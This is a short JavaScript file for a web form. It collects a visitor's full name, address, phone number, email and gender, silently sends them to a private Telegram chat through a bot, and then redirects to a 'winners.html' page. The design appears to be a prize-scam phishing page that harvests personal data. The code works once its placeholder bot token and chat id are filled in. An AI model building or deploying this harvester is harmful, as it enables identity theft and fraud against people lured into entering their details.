const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
const telegramChatId = "YOUR_CHAT_ID";

document.getElementById("user-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const message = `
        Name: ${formData.get("fullName")}
        Address: ${formData.get("address")}
        Phone: ${formData.get("phoneNumber")}
        Email: ${formData.get("email")}
        Gender: ${formData.get("gender")}
    `;
    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: telegramChatId, text: message }),
    });
    window.location.href = "winners.html";
});
